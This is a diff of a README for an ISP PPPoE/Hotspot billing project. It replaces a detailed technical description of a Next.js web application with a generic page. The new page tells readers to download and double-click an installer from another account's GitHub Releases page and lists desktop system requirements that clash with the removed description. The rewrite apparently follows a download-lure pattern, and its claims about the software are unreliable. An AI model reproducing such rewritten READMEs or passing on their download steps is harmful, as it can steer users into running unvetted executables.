@@ -1,59 +1,62 @@
-# AIBILL RADIUS - Billing System for RTRW.NET
-A modern, full-stack ISP billing and network management platform engineered for RTRW.NET, delivering accurate Nairobi (EAT, UTC+3) time synchronization, integrated M-Pesa payment workflows, automated WhatsApp & SMS notification pipelines, comprehensive PPPoE and Hotspot management, and multi-tenant billing and subscriber management for efficient ISP operations.
+# ✅ PPPoE_and_Hotspot-Management-System - Effortless User and Payment Management
 
-## 🎯 Key Features
+## 🌐 Overview
+Welcome to the PPPoE and Hotspot Management System. This application provides tools for managing users, sessions, and payments in a fluid and efficient manner. With features like PPPoE management, voucher generation, automated session accounting, and SMS notifications, it is perfect for Internet Service Providers (ISPs) looking for streamlined solutions.
 
-- ✅ Proper Nairobi Timezone Handling – All dates stored in UTC, displayed in EAT
-- 🎨 Premium UI – Mobile-first responsive design with dark mode
-- ⚡ Modern Stack – Next.js 15, TypeScript, Tailwind CSS, Prisma
-- 🔐 Secure – Built-in authentication structure
-- 📱 SPA Experience – Fast, smooth navigation without page reloads
-- 💳 M-Pesa Integration – STK Push and payment callbacks
-- 📩 Notifications – WhatsApp & SMS alerts for invoices, payments, and events
+## 📥 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/releases)
 
-## 🚀 Tech Stack
+## 🚀 Getting Started
+Follow these steps to get started with our application:
 
-- Framework: Next.js 15 (App Router)
-- Language: TypeScript
-- Styling: Tailwind CSS
-- Database: MySQL with Prisma ORM
-- Icons: Lucide React
-- Date Handling: date-fns with timezone support
-- Messaging: WhatsApp & SMS APIs
-- Payments: M-Pesa API
+1. **Visit the Release Page**  
+   Go to our [Releases page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/releases) to find the latest version of the software.
 
-## 📋 Admin Panel Modules
+2. **Download the Application**  
+   Once on the Releases page, look for the latest version. Click on the appropriate file for your system to start the download. Make sure to save it in a location that you can easily access.
 
-- Dashboard – Overview with stats and real-time data
-- PPPoE Management – Users and profiles
-- Hotspot Management – Vouchers, profiles, and templates
-- Agent Management – Reseller accounts
-- Invoices – Billing and payment tracking
-- Payment Gateway – M-Pesa, Midtrans, Xendit
-- Keuangan – Financial reporting
-- Sessions – Active connections monitoring
-- WhatsApp & SMS Integration – Automated notifications
-- Network Management – Router/NAS configuration
-- Network Map – Visual network topology
-- Settings – Company profile, cron jobs, GenieACS
+3. **Install the Application**  
+   Locate the downloaded file and double-click it to run the installer. Follow the prompts in the setup wizard. This process will guide you through the necessary steps to install the software on your computer.
 
-## 🕐 Timezone Handling (Nairobi/EAT)
+4. **Launch the Application**  
+   After installation, find the application in your programs list or your desktop. Open it by double-clicking the icon.
 
-- Database Storage (UTC) – All dates stored in MySQL as UTC; Prisma handles automatically
-- Display (EAT) – Frontend converts UTC to Nairobi/EAT using `date-fns-tz`
-  - `toEAT()` – Convert UTC to EAT for display
-  - `toUTC()` – Convert EAT to UTC for storage
-  - `formatEAT()` – Format dates in EAT
-  - `isExpired()` – Check expiry in EAT context
+5. **Set Up Your Account**  
+   The first time you run the application, you will need to set up your admin account. Follow the on-screen instructions to create your login credentials.
 
-## 🌍 Environment Variables
+6. **Configure Your Settings**  
+   Once logged in, navigate to the settings menu. Here, you can configure various options like session management, billing settings, and SMS notifications according to your needs.
 
-```bash
-TZ="Africa/Nairobi"
-NEXT_PUBLIC_TIMEZONE="Africa/Nairobi"
+## 📋 Features
+- **PPPoE Management**: Easily manage PPPoE connections for your users.
+- **Hotspot Management**: Control access to your hotspot and track usage.
+- **Voucher Generation**: Create vouchers for easy user access, ideal for retail scenarios.
+- **Session Accounting**: Automate session logging with FreeRADIUS for accurate billing and tracking.
+- **Multi-Tenant Billing**: Support multiple customers with a robust billing system.
+- **M-Pesa Payments**: Integrate mobile payments easily for convenience.
+- **SMS Notifications**: Keep users informed with automated SMS alerts.
 
----
+## 🔧 System Requirements
+To successfully run the PPPoE and Hotspot Management System, ensure your system meets the following requirements:
 
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or the latest version of a Linux distribution.
+- **RAM**: Minimum of 4GB. Recommended 8GB for optimal performance.
+- **Storage**: At least 500MB of free space for installation.
+- **Internet Connection**: Required for initial setup and updates.
 
-Made with ❤️ by Mwaki Denis
+## 📊 Getting Help
+If you encounter any issues or have questions during installation or usage, check out the following resources:
 
+- **Documentation**: Detailed guides are available on the [Wiki page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/wiki).
+- **Community Support**: Join discussions with other users on our [GitHub Discussions page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/discussions).
+- **Contact Us**: If you need direct support, you can reach out via email at [support@example.com](mailto:support@example.com).
+
+## 📬 Feedback
+We appreciate any feedback you might have about your experience using the PPPoE and Hotspot Management System. Your insights help us improve the software and better serve users like you.
+
+## 🔗 Important Links
+- [Releases Page](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/releases)
+- [Documentation](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/wiki)
+- [GitHub Discussions](https://github.com/Ammar1sa/PPPoE_and_Hotspot-Management-System/discussions)
+
+Thank you for choosing the PPPoE and Hotspot Management System. Enjoy the seamless management of your users and payments!
